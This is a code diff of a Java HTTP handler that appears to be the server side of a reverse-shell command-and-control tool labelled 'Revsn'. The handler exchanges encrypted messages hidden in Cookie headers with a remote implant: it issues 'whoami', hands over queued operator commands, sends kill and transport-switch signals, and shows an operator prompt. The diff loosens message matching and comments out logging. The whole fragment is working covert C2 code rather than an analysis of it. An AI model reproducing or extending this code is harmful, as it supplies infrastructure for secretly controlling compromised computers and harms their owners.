@@ -108,21 +108,25 @@ public class HTTPHandler implements HttpRequestHandler, HttpHandler{
             if(request.getHeaders("Cookie") != null) {
                 cookie = request.getHeaders("Cookie")[0].getValue();
 
-                if(cookie.length() > 1) {
-
+                if(cookie.length() >= 4) {
                     msg = protocol.processMessage(cookie, sessionNumber);
-                        //msg = new String(cipherDec.doFinal(Base64.decodeBase64(cookie)));
-                    if(msg.equals("est")) {
-                        est = true;
+
+                    //logger.info("Cookie: " + cookie + "\n");
+                    //logger.info("Message: " + msg + "\n");
+
+                    if(msg.equals("est") || msg.equals("esv") || msg.equals("este")) {
                         response.setHeader("Cookie", protocol.prepareMessage("whoami", sessionNumber));
                     } else if(msg.equals("kill")) {
                          response.setHeader("Cookie", protocol.prepareMessage("quit", sessionNumber));
-                    } else if(msg.equals("give") && answerCommands.length() > 0) {
+                    } else if((msg.equals("give") || msg.equals("give ") || msg.equals(" give") || msg.equals("giv") || msg.equals("gcte"))&& answerCommands.length() > 0) {
                         response.setHeader("Cookie", answerCommands);
                         answerCommands = "";
-                    } else if(msg.equals("give") && answerCommands.length() == 0) {
+                    } else if((msg.equals("give") || msg.equals("give ") || msg.equals(" give") || msg.equals("giv") || msg.equals("gcte")) && answerCommands.length() == 0) {
                         response.setHeader("Cookie", "");
-                    } else {
+                    } else if(msg.equals("Failed to decrypt message!")) {
+                        response.setHeader("Cookie", protocol.prepareMessage("httpSw", sessionNumber));
+                    }
+                    else {
                         System.out.print("Revsn [HTTP]["+ ip +"]["+sessionNumber+"]» ");
                     }
                     response.setStatusCode(200);
